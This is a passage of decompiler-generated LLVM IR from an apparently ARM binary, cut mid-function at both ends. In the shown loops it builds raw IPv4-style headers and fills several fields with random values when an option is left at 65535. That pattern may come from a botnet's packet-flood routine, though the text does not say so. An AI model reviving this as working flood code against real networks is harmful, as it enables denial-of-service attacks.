  store i32 %v0_c638, i32* %v3_c638, align 4
  %v0_c63c = load i32, i32* %r2.global-to-local, align 4
  %v1_c63c = trunc i32 %v0_c63c to i8
  %v2_c63c = load i32, i32* @sb, align 4
  %v3_c63c = add i32 %v2_c63c, 56
  %v4_c63c = inttoptr i32 %v3_c63c to i8*
  store i8 %v1_c63c, i8* %v4_c63c, align 1
  %v0_c640 = load i32, i32* %r1.global-to-local, align 4
  %v1_c640 = trunc i32 %v0_c640 to i8
  %v2_c640 = load i32, i32* @sb, align 4
  %v3_c640 = add i32 %v2_c640, 58
  %v4_c640 = inttoptr i32 %v3_c640 to i8*
  store i8 %v1_c640, i8* %v4_c640, align 1
  %v0_c644 = load i32, i32* %r1.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* @sb, align 4
  %v3_c644 = add i32 %v2_c644, 57
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v3_c648 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c648, i32* %r3.global-to-local, align 4
  %v1_c64c = load i32, i32* %r2.global-to-local, align 4
  %v2_c64c = add i32 %v1_c64c, %v3_c648
  store i32 %v2_c64c, i32* @r4, align 4
  %v1_c650 = load i32, i32* @r7, align 4
  %v9_c650 = icmp eq i32 %v2_c64c, %v1_c650
  store i1 %v9_c650, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c64c, i32* %stack_var_-44, align 4
  %v6_c658 = icmp slt i32 %v2_c64c, %v1_c650
  br i1 %v6_c658, label %dec_label_pc_c65c, label %dec_label_pc_c7f0.preheader

dec_label_pc_c7f0.preheader:                      ; preds = %dec_label_pc_c50c, %dec_label_pc_c46c
  %v0_c7f45 = phi i32 [ 0, %dec_label_pc_c46c ], [ %v1_c650, %dec_label_pc_c50c ]
  %v3_c850 = icmp eq i32 %v6_c420, -1
  %v8_c850 = icmp eq i32 %v6_c420, -1
  %v3_c86c = icmp eq i32 %v3_c494, 65535
  %v2_c75c = icmp eq i32 %v1_c49c, 0
  br label %dec_label_pc_c7f0

dec_label_pc_c65c:                                ; preds = %dec_label_pc_c50c, %dec_label_pc_c4b8
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_c664 = call i32 @function_13258(i32 128, i32 1)
  store i32 %v2_c28c, i32* %r2.global-to-local, align 4
  %v3_c66c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c66c, i32* %r3.global-to-local, align 4
  %v2_c670 = load i32, i32* @r4, align 4
  %v5_c670 = mul i32 %v2_c670, 4
  %v6_c670 = add i32 %v5_c670, %v2_c28c
  %v7_c670 = inttoptr i32 %v6_c670 to i32*
  store i32 %v2_c664, i32* %v7_c670, align 4
  %v0_c674 = load i32, i32* %r2.global-to-local, align 4
  %v1_c674 = load i32, i32* %r3.global-to-local, align 4
  %v4_c674 = mul i32 %v1_c674, 4
  %v5_c674 = add i32 %v4_c674, %v0_c674
  %v6_c674 = inttoptr i32 %v5_c674 to i32*
  %v7_c674 = load i32, i32* %v6_c674, align 4
  store i32 %v7_c674, i32* @sb, align 4
  %v1_c678 = inttoptr i32 %v7_c674 to i8*
  %v2_c678 = load i8, i8* %v1_c678, align 1
  %tmp57 = urem i8 %v2_c678, 16
  %v1_c67c = zext i8 %tmp57 to i32
  %v1_c680 = or i32 %v1_c67c, 64
  store i32 %v1_c680, i32* %r2.global-to-local, align 4
  %v1_c684 = trunc i32 %v1_c680 to i8
  store i8 %v1_c684, i8* %v1_c678, align 1
  %v0_c688 = load i32, i32* @sb, align 4
  %v1_c688 = inttoptr i32 %v0_c688 to i8*
  %v2_c688 = load i8, i8* %v1_c688, align 1
  %v1_c68c = and i8 %v2_c688, -16
  %v1_c690 = or i8 %v1_c68c, 5
  store i8 %v1_c690, i8* %v1_c688, align 1
  store i32 %v4_c698, i32* %r3.global-to-local, align 4
  %v2_c6a0 = load i32, i32* @sb, align 4
  %v3_c6a0 = add i32 %v2_c6a0, 1
  %v4_c6a0 = inttoptr i32 %v3_c6a0 to i8*
  store i8 %v5_c2c4, i8* %v4_c6a0, align 1
  %v1_c6a4 = call i32 @function_14898(i32 60)
  %v2_c6a4 = trunc i32 %v1_c6a4 to i16
  %v3_c6a8 = load i32, i32* @sb, align 4
  %v4_c6a8 = add i32 %v3_c6a8, 2
  %v5_c6a8 = inttoptr i32 %v4_c6a8 to i16*
  store i16 %v2_c6a4, i16* %v5_c6a8, align 2
  %v1_c6b0 = call i32 @function_14898(i32 %v3_c494)
  %v2_c6b0 = trunc i32 %v1_c6b0 to i16
  store i32 %v1_c30c, i32* %r1.global-to-local, align 4
  store i32 %v4_c6b8, i32* %r2.global-to-local, align 4
  store i1 %v2_c6bc, i1* %cpsr_z.global-to-local, align 1
  %v3_c6c0 = load i32, i32* @sb, align 4
  %v4_c6c0 = add i32 %v3_c6c0, 4
  %v5_c6c0 = inttoptr i32 %v4_c6c0 to i16*
  store i16 %v2_c6b0, i16* %v5_c6c0, align 2
  %v0_c6c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_c6c4 = trunc i32 %v0_c6c4 to i8
  %v2_c6c4 = load i32, i32* @sb, align 4
  %v3_c6c4 = add i32 %v2_c6c4, 8
  %v4_c6c4 = inttoptr i32 %v3_c6c4 to i8*
  store i8 %v1_c6c4, i8* %v4_c6c4, align 1
  %v0_c6c8 = load i32, i32* @sb, align 4
  %v1_c6c8 = add i32 %v0_c6c8, 20
  store i32 %v1_c6c8, i32* @sl, align 4
  %v0_c6cc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c6cc, label %dec_label_pc_c50c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c65c
  %v1_c6d4 = call i32 @function_14898(i32 16384)
  %v2_c6d4 = trunc i32 %v1_c6d4 to i16
  %v3_c6d8 = load i32, i32* @sb, align 4
  %v4_c6d8 = add i32 %v3_c6d8, 6
  %v5_c6d8 = inttoptr i32 %v4_c6d8 to i16*
  store i16 %v2_c6d4, i16* %v5_c6d8, align 2
  %v2_c510.pre = load i32, i32* @sb, align 4
  br label %dec_label_pc_c50c

dec_label_pc_c6e0:                                ; preds = %dec_label_pc_c7f0
  br label %dec_label_pc_c6e4

dec_label_pc_c6e4:                                ; preds = %dec_label_pc_c764, %dec_label_pc_c6e0
  %v1_c6f8 = phi i32 [ %v1_c7e0, %dec_label_pc_c764 ], [ 0, %dec_label_pc_c6e0 ]
  %v5_c6e8 = mul i32 %v1_c6f8, 24
  %v1_c6ec = load i32, i32* @r8, align 4
  %v2_c6ec = add i32 %v1_c6ec, %v5_c6e8
  store i32 %v2_c6ec, i32* %r3.global-to-local, align 4
  store i32 %v2_c28c, i32* %r1.global-to-local, align 4
  %v1_c6f4 = add i32 %v2_c6ec, 20
  %v2_c6f4 = inttoptr i32 %v1_c6f4 to i8*
  %v3_c6f4 = load i8, i8* %v2_c6f4, align 1
  %v4_c6f4 = zext i8 %v3_c6f4 to i32
  store i32 %v4_c6f4, i32* %r2.global-to-local, align 4
  %v4_c6f8 = mul i32 %v1_c6f8, 4
  %v5_c6f8 = add i32 %v4_c6f8, %v2_c28c
  %v6_c6f8 = inttoptr i32 %v5_c6f8 to i32*
  %v7_c6f8 = load i32, i32* %v6_c6f8, align 4
  store i32 %v7_c6f8, i32* @r5, align 4
  %v7_c6fc = icmp eq i8 %v3_c6f4, 31
  store i1 %v7_c6fc, i1* %cpsr_z.global-to-local, align 1
  %v1_c700 = add i32 %v7_c6f8, 20
  store i32 %v1_c700, i32* @r6, align 4
  %tmp58 = icmp ult i8 %v3_c6f4, 32
  br i1 %tmp58, label %dec_label_pc_c820, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %dec_label_pc_c6e4
  store i32 %v6_c420, i32* %r2.global-to-local, align 4
  store i1 %v8_c850, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c850, label %dec_label_pc_c85c, label %dec_label_pc_c714

dec_label_pc_c714:                                ; preds = %dec_label_pc_c820, %dec_label_pc_c708
  store i32 %v3_c494, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c86c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c86c, label %dec_label_pc_c878, label %dec_label_pc_c728

dec_label_pc_c728:                                ; preds = %dec_label_pc_c85c.dec_label_pc_c728_crit_edge, %dec_label_pc_c714
  %v1_c72c = phi i32 [ %v1_c72c.pre, %dec_label_pc_c85c.dec_label_pc_c728_crit_edge ], [ 65535, %dec_label_pc_c714 ]
  %v9_c72c = icmp eq i32 %v3_c498, %v1_c72c
  store i1 %v9_c72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c72c, label %dec_label_pc_c88c, label %dec_label_pc_c734

dec_label_pc_c734:                                ; preds = %dec_label_pc_c878, %dec_label_pc_c728
  %v1_c738 = phi i32 [ %v1_c884, %dec_label_pc_c878 ], [ %v1_c72c, %dec_label_pc_c728 ]
  store i32 %v3_c484, i32* %r1.global-to-local, align 4
  %v9_c738 = icmp eq i32 %v3_c484, %v1_c738
  store i1 %v9_c738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c738, label %dec_label_pc_c8a0, label %dec_label_pc_c740

dec_label_pc_c740:                                ; preds = %dec_label_pc_c88c.dec_label_pc_c740_crit_edge, %dec_label_pc_c734
  %v1_c744 = phi i32 [ %v1_c744.pre, %dec_label_pc_c88c.dec_label_pc_c740_crit_edge ], [ %v1_c738, %dec_label_pc_c734 ]
  store i32 %v6_c35c, i32* %r2.global-to-local, align 4
  %v9_c744 = icmp eq i32 %v6_c35c, %v1_c744
  store i1 %v9_c744, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c744, label %dec_label_pc_c8b4, label %dec_label_pc_c74c

dec_label_pc_c74c:                                ; preds = %dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge, %dec_label_pc_c740
  %v1_c750 = phi i32 [ %v1_c750.pre, %dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge ], [ %v1_c744, %dec_label_pc_c740 ]
  store i32 %v6_c374, i32* %r3.global-to-local, align 4
  %v9_c750 = icmp eq i32 %v6_c374, %v1_c750
  store i1 %v9_c750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c750, label %dec_label_pc_c8c8, label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %dec_label_pc_c8b4, %dec_label_pc_c74c, %dec_label_pc_c8c8
  store i1 %v2_c75c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c75c, label %dec_label_pc_c764, label %dec_label_pc_c814

dec_label_pc_c764:                                ; preds = %dec_label_pc_c758, %dec_label_pc_c814
  %v2_c768 = load i32, i32* @r5, align 4
  %v3_c768 = add i32 %v2_c768, 10
  %v4_c768 = inttoptr i32 %v3_c768 to i16*
  store i16 0, i16* %v4_c768, align 2
  %v0_c76c = load i32, i32* @r5, align 4
  store i32 %v0_c76c, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c774 = call i32 @function_dadc(i32 %v0_c76c, i32 20)
  %v3_c774 = trunc i32 %v2_c774 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c77c = load i32, i32* @r5, align 4
  %v4_c77c = add i32 %v3_c77c, 10
  %v5_c77c = inttoptr i32 %v4_c77c to i16*
  store i16 %v3_c774, i16* %v5_c77c, align 2
  %v0_c780 = load i32, i32* %r2.global-to-local, align 4
  %v1_c780 = trunc i32 %v0_c780 to i16
  %v2_c780 = load i32, i32* @r6, align 4
  %v3_c780 = add i32 %v2_c780, 16
  %v4_c780 = inttoptr i32 %v3_c780 to i16*
  store i16 %v1_c780, i16* %v4_c780, align 2
  %v1_c788 = call i32 @function_14898(i32 40)
  %v0_c78c = load i32, i32* @r6, align 4
  store i32 %v0_c78c, i32* @r1, align 4
  store i32 %v1_c788, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  %v0_c798 = load i32, i32* @r5, align 4
  %v4_c79c = call i32 @function_db2c(i32 %v0_c798, i32 %v0_c78c, i32 %v1_c788, i32 40)
  %v5_c79c = trunc i32 %v4_c79c to i16
  %v3_c7a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7a0, i32* %r3.global-to-local, align 4
  %v3_c7a4 = mul i32 %v3_c7a0, 32
  store i32 %v3_c7a4, i32* %lr.global-to-local, align 4
  %v3_c7a8 = load i32, i32* @r6, align 4
  %v4_c7a8 = add i32 %v3_c7a8, 16
  %v5_c7a8 = inttoptr i32 %v4_c7a8 to i16*
  store i16 %v5_c79c, i16* %v5_c7a8, align 2
  %v0_c7ac = load i32, i32* %lr.global-to-local, align 4
  %v1_c7ac = load i32, i32* %r3.global-to-local, align 4
  %tmp59 = mul i32 %v1_c7ac, -8
  %v5_c7ac = add i32 %v0_c7ac, %tmp59
  store i32 %v5_c7ac, i32* %lr.global-to-local, align 4
  %v0_c7b0 = load i32, i32* @r6, align 4
  %v1_c7b0 = add i32 %v0_c7b0, 2
  %v2_c7b0 = inttoptr i32 %v1_c7b0 to i16*
  %v3_c7b0 = load i16, i16* %v2_c7b0, align 2
  %v1_c7b4 = load i32, i32* @r8, align 4
  %v2_c7b4 = add i32 %v1_c7b4, %v5_c7ac
  store i32 %v2_c7b4, i32* @lr, align 4
  %v3_c7b8 = add i32 %v2_c7b4, 2
  %v4_c7b8 = inttoptr i32 %v3_c7b8 to i16*
  store i16 %v3_c7b0, i16* %v4_c7b8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_c7c4 = load i32, i32* @r5, align 4
  store i32 %v0_c7c4, i32* @r1, align 4
  %v0_c7c8 = load i32, i32* @fp, align 4
  store i32 %v0_c7c8, i32* @r0, align 4
  store i32 60, i32* @r2, align 4
  %v0_c7d8 = call i32 @function_14ae4()
  %v3_c7dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c7dc, i32* %r3.global-to-local, align 4
  %v1_c7e0 = add i32 %v3_c7dc, 1
  %v1_c7e4 = load i32, i32* @r7, align 4
  %v9_c7e4 = icmp eq i32 %v1_c7e0, %v1_c7e4
  store i1 %v9_c7e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c7e0, i32* %stack_var_-44, align 4
  %v5_c7ec = icmp slt i32 %v1_c7e0, %v1_c7e4
  br i1 %v5_c7ec, label %dec_label_pc_c6e4, label %dec_label_pc_c7f0

dec_label_pc_c7f0:                                ; preds = %dec_label_pc_c800, %dec_label_pc_c764, %dec_label_pc_c7f0.preheader
  %v0_c804 = phi i32 [ %v0_c7f45, %dec_label_pc_c7f0.preheader ], [ 0, %dec_label_pc_c800 ], [ %v1_c7e4, %dec_label_pc_c764 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c7f4 = icmp eq i32 %v0_c804, 0
  store i1 %v2_c7f4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c7f4, label %dec_label_pc_c800, label %dec_label_pc_c6e0

dec_label_pc_c800:                                ; preds = %dec_label_pc_c7f0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_c7f0

dec_label_pc_c814:                                ; preds = %dec_label_pc_c758
  %v0_c814 = call i32 @function_f570()
  %v1_c814 = trunc i32 %v0_c814 to i16
  %v3_c818 = load i32, i32* @r6, align 4
  %v4_c818 = add i32 %v3_c818, 18
  %v5_c818 = inttoptr i32 %v4_c818 to i16*
  store i16 %v1_c814, i16* %v5_c818, align 2
  br label %dec_label_pc_c764

dec_label_pc_c820:                                ; preds = %dec_label_pc_c6e4
  %v1_c820 = add i32 %v2_c6ec, 16
  %v2_c820 = inttoptr i32 %v1_c820 to i32*
  %v3_c820 = load i32, i32* %v2_c820, align 4
  %v1_c824 = call i32 @function_14a1c(i32 %v3_c820)
  store i32 %v1_c824, i32* %r4.global-to-local, align 4
  %v0_c82c = call i32 @function_f570()
  %v3_c830 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c830, i32* %r2.global-to-local, align 4
  %v5_c838 = mul i32 %v3_c830, 24
  %v1_c83c = load i32, i32* @r8, align 4
  %v2_c83c = add i32 %v1_c83c, %v5_c838
  store i32 %v2_c83c, i32* %r3.global-to-local, align 4
  %v1_c840 = add i32 %v2_c83c, 20
  %v2_c840 = inttoptr i32 %v1_c840 to i8*
  %v3_c840 = load i8, i8* %v2_c840, align 1
  %v4_c840 = zext i8 %v3_c840 to i32
  store i32 %v4_c840, i32* %r2.global-to-local, align 4
  %v0_c844 = load i32, i32* %r4.global-to-local, align 4
  %v7_c844 = lshr i32 %v0_c82c, %v4_c840
  %v8_c844 = add i32 %v7_c844, %v0_c844
  %v1_c848 = call i32 @function_14874(i32 %v8_c844)
  store i32 %v6_c420, i32* %r2.global-to-local, align 4
  store i1 %v8_c850, i1* %cpsr_z.global-to-local, align 1
  %v1_c854 = load i32, i32* @r5, align 4
  %v2_c854 = add i32 %v1_c854, 16
  %v3_c854 = inttoptr i32 %v2_c854 to i32*
  store i32 %v1_c848, i32* %v3_c854, align 4
  br i1 %v3_c850, label %dec_label_pc_c85c, label %dec_label_pc_c714

dec_label_pc_c85c:                                ; preds = %dec_label_pc_c820, %dec_label_pc_c708
  %v0_c85c = call i32 @function_f570()
  store i32 %v3_c494, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c86c, i1* %cpsr_z.global-to-local, align 1
  %v1_c870 = load i32, i32* @r5, align 4
  %v2_c870 = add i32 %v1_c870, 12
  %v3_c870 = inttoptr i32 %v2_c870 to i32*
  store i32 %v0_c85c, i32* %v3_c870, align 4
  br i1 %v3_c86c, label %dec_label_pc_c878, label %dec_label_pc_c85c.dec_label_pc_c728_crit_edge

dec_label_pc_c85c.dec_label_pc_c728_crit_edge:    ; preds = %dec_label_pc_c85c
  %v1_c72c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c728

dec_label_pc_c878:                                ; preds = %dec_label_pc_c85c, %dec_label_pc_c714
  %v0_c878 = call i32 @function_f570()
  %v1_c878 = trunc i32 %v0_c878 to i16
  %v3_c87c = load i32, i32* @r5, align 4
  %v4_c87c = add i32 %v3_c87c, 4
  %v5_c87c = inttoptr i32 %v4_c87c to i16*
  store i16 %v1_c878, i16* %v5_c87c, align 2
  %v1_c884 = load i32, i32* @r4, align 4
  %v9_c884 = icmp eq i32 %v3_c498, %v1_c884
  store i1 %v9_c884, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c884, label %dec_label_pc_c88c, label %dec_label_pc_c734

dec_label_pc_c88c:                                ; preds = %dec_label_pc_c878, %dec_label_pc_c728
  %v0_c88c = call i32 @function_f570()
  %v1_c88c = trunc i32 %v0_c88c to i16
  store i32 %v3_c484, i32* %r1.global-to-local, align 4
  %v1_c894 = load i32, i32* @r4, align 4
  %v9_c894 = icmp eq i32 %v3_c484, %v1_c894
  store i1 %v9_c894, i1* %cpsr_z.global-to-local, align 1
  %v3_c898 = load i32, i32* @r5, align 4
  %v4_c898 = add i32 %v3_c898, 20
  %v5_c898 = inttoptr i32 %v4_c898 to i16*
  store i16 %v1_c88c, i16* %v5_c898, align 2
  br i1 %v9_c894, label %dec_label_pc_c8a0, label %dec_label_pc_c88c.dec_label_pc_c740_crit_edge

dec_label_pc_c88c.dec_label_pc_c740_crit_edge:    ; preds = %dec_label_pc_c88c
  %v1_c744.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c740

dec_label_pc_c8a0:                                ; preds = %dec_label_pc_c88c, %dec_label_pc_c734
  %v0_c8a0 = call i32 @function_f570()
  %v1_c8a0 = trunc i32 %v0_c8a0 to i16
  store i32 %v6_c35c, i32* %r2.global-to-local, align 4
  %v1_c8a8 = load i32, i32* @r4, align 4
  %v9_c8a8 = icmp eq i32 %v6_c35c, %v1_c8a8
  store i1 %v9_c8a8, i1* %cpsr_z.global-to-local, align 1
  %v3_c8ac = load i32, i32* @r6, align 4
  %v4_c8ac = add i32 %v3_c8ac, 2
  %v5_c8ac = inttoptr i32 %v4_c8ac to i16*
  store i16 %v1_c8a0, i16* %v5_c8ac, align 2
  br i1 %v9_c8a8, label %dec_label_pc_c8b4, label %dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge

dec_label_pc_c8a0.dec_label_pc_c74c_crit_edge:    ; preds = %dec_label_pc_c8a0
  %v1_c750.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c74c

dec_label_pc_c8b4:                                ; preds = %dec_label_pc_c8a0, %dec_label_pc_c740
  %v0_c8b4 = call i32 @function_f570()
  store i32 %v6_c374, i32* %r3.global-to-local, align 4
  %v1_c8bc = load i32, i32* @r4, align 4
  %v9_c8bc = icmp eq i32 %v6_c374, %v1_c8bc
  store i1 %v9_c8bc, i1* %cpsr_z.global-to-local, align 1
  %v1_c8c0 = load i32, i32* @r6, align 4
  %v2_c8c0 = add i32 %v1_c8c0, 4
  %v3_c8c0 = inttoptr i32 %v2_c8c0 to i32*
  store i32 %v0_c8b4, i32* %v3_c8c0, align 4
  br i1 %v9_c8bc, label %dec_label_pc_c8c8, label %dec_label_pc_c758

dec_label_pc_c8c8:                                ; preds = %dec_label_pc_c8b4, %dec_label_pc_c74c
  %v0_c8c8 = call i32 @function_f570()
  %v1_c8cc = load i32, i32* @r6, align 4
  %v2_c8cc = add i32 %v1_c8cc, 8
  %v3_c8cc = inttoptr i32 %v2_c8cc to i32*
  store i32 %v0_c8c8, i32* %v3_c8cc, align 4
  br label %dec_label_pc_c758

dec_label_pc_c8d4:                                ; preds = %dec_label_pc_c444
  %v0_c8d4 = load i32, i32* @fp, align 4
  store i32 %v0_c8d4, i32* @r0, align 4
  %v1_c8d8 = call i32 @function_15b6c(i32 %v0_c8d4)
  br label %dec_label_pc_c8dc

dec_label_pc_c8dc:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c8d4
  %v1_c8e4 = phi i32 [ %v3_c434, %dec_label_pc_c270 ], [ %v1_c8d8, %dec_label_pc_c8d4 ]
  store i32 %v3_c270, i32* %r4.global-to-local, align 4
  store i32 %v27_c270, i32* %lr.global-to-local, align 4
  ret i32 %v1_c8e4

; uselistorder directives
  uselistorder i32 %v1_c884, { 1, 0 }
  uselistorder i32 %v1_c7e0, { 2, 0, 3, 1 }
  uselistorder i32 %v5_c7ac, { 1, 0 }
  uselistorder i32 %v0_c6c8, { 1, 0 }
  uselistorder i1 %v3_c86c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c64c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_c4ec, { 2, 1, 0 }
  uselistorder i32 %v1_c4e8, { 2, 0, 1 }
  uselistorder i32 %v1_c4e4, { 2, 0, 1 }
  uselistorder i32 %v1_c4e0, { 2, 0, 1 }
  uselistorder i32 %v1_c4dc, { 1, 0 }
  uselistorder i32 %v1_c4d8, { 2, 0, 1 }
  uselistorder i32 %v1_c49c, { 1, 0 }
  uselistorder i32 %v3_c494, { 0, 1, 2, 4, 3 }
  uselistorder i1 %v7_c464, { 1, 0 }
  uselistorder i1 %v7_c438, { 1, 0 }
  uselistorder i32 %v3_c434, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_c420, { 3, 2, 0, 4, 1 }
  uselistorder i32 %v6_c374, { 3, 2, 1, 0 }
  uselistorder i32 %v6_c35c, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 %v5_c2c4, { 1, 0 }
  uselistorder i32 %v2_c28c, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12, 28, 29, 30, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 24, 25, 26, 27, 28, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 31, 30, 33, 32, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 16, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 17, 20, 21, 22 }
  uselistorder i32 60, { 1, 0 }
  uselistorder i32 59, { 1, 0 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c8dc, { 1, 0 }
  uselistorder label %dec_label_pc_c764, { 1, 0 }
  uselistorder label %dec_label_pc_c758, { 2, 0, 1 }
  uselistorder label %dec_label_pc_c50c, { 1, 0 }
}

define i32 @function_c8ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_c8ec:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_c8ec = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_c908 = call i32 @function_13258(i32 %arg1, i32 4)
  store i32 %v2_c908, i32* @sl, align 4
  %v0_c914 = load i32, i32* @r7, align 4
  %v2_c918 = call i32 @function_13258(i32 %v0_c914, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_c924 = load i32, i32* @r6, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_c918, i32* @r8, align 4
  %v0_c934 = load i32, i32* @r5, align 4
  %v4_c938 = inttoptr i32 %v0_c924 to i32*
  %v5_c938 = call i32 @function_a430(i32 %v0_c934, i32* %v4_c938, i32 7, i32 65535)
  %v3_c940 = urem i32 %v5_c938, 65536
  %v0_c944 = load i32, i32* @r6, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_c94c = load i32, i32* @r4, align 4
  store i32 %v0_c94c, i32* %r3.global-to-local, align 4
  %v0_c950 = load i32, i32* @r5, align 4
  %v5_c958 = inttoptr i32 %v0_c944 to i32*
  %v6_c958 = call i32 @function_a430(i32 %v0_c950, i32* %v5_c958, i32 6, i32 %v0_c94c)
  %v0_c95c = load i32, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_c96c = load i32, i32* @r5, align 4
  %v3_c970 = urem i32 %v6_c958, 65536
  store i32 %v3_c970, i32* %sb.global-to-local, align 4
  %v4_c974 = inttoptr i32 %v0_c95c to i32*
  %v5_c974 = call i32 @function_a430(i32 %v0_c96c, i32* %v4_c974, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_c984 = load i32, i32* @r5, align 4
  %v0_c988 = load i32, i32* @r6, align 4
  %v3_c98c = urem i32 %v5_c974, 65536
  store i32 %v3_c98c, i32* @r5, align 4
  %v4_c990 = inttoptr i32 %v0_c988 to i32*
  %v5_c990 = call i32 @function_a430(i32 %v0_c984, i32* %v4_c990, i32 1, i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_c998 = urem i32 %v5_c990, 256
  %v0_c99c = load i32, i32* %sb.global-to-local, align 4
  %v1_c99c = load i32, i32* @r4, align 4
  %v9_c99c = icmp eq i32 %v0_c99c, %v1_c99c
  store i32 0, i32* %stack_var_-56, align 4
  br i1 %v9_c99c, label %dec_label_pc_cb24, label %dec_label_pc_c9b8

dec_label_pc_c9b8:                                ; preds = %dec_label_pc_c8ec
  %v1_c9bc = call i32 @function_14898(i32 %v0_c99c)
  %v2_c9bc = trunc i32 %v1_c9bc to i16
  br label %dec_label_pc_c9c4

dec_label_pc_c9c4:                                ; preds = %dec_label_pc_cb24, %dec_label_pc_c9b8
  %storemerge2 = phi i16 [ %v5_cb30, %dec_label_pc_cb24 ], [ %v2_c9bc, %dec_label_pc_c9b8 ]
  %v0_c9c4 = load i32, i32* @r7, align 4
  %v2_c9c4 = icmp eq i32 %v0_c9c4, 0
  br i1 %v2_c9c4, label %dec_label_pc_cae8, label %dec_label_pc_c9cc

dec_label_pc_c9cc:                                ; preds = %dec_label_pc_c9c4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v2_ca08 = ptrtoint i32* %stack_var_-56 to i32
  %v4_ca28 = sext i16 %storemerge2 to i32
  br label %dec_label_pc_ca5c

dec_label_pc_c9dc:                                ; preds = %dec_label_pc_ca5c
  %v1_c9dc = call i32 @function_14898(i32 %v3_c940)
  %v2_c9dc = trunc i32 %v1_c9dc to i16
  store i32 %stack_var_-60.0, i32* %r3.global-to-local, align 4
  %v3_c9e4 = load i32, i32* @r6, align 4
  %v4_c9e4 = add i32 %v3_c9e4, 2
  %v5_c9e4 = inttoptr i32 %v4_c9e4 to i16*
  store i16 %v2_c9dc, i16* %v5_c9e4, align 2
